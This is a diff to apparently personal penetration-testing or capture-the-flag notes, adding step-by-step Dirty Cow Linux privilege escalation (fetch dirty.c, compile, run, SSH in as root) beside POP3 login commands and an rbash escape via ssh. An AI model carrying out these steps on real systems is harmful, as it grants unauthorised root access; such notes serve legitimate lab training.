@@ -47,7 +47,18 @@ Retreiving emails from an email server
 	- USER <username>
 	- PASS <Password>
 	- retr 1
-	- retr 2 
+	- retr 2
+
+Dirty Cow (Linux Prive Esc) 
+	- Download on the attacker machine: https://raw.githubusercontent.com/FireFart/dirtycow/master/dirty.c
+	- uploade it to the vicitm 
+	- the vicitm needs to have gcc installed 
+	- on the vicitm: 
+		- gcc -pthread dirty.c -o dirty -lcrypt
+		- chmod 777 dirty 
+		- ./dirty <desired password>
+	- use the password to ssh into the vicitm in a new window. 
+	
 
 rbash escape: ssh mindy@10.10.10.51 -t bash
 
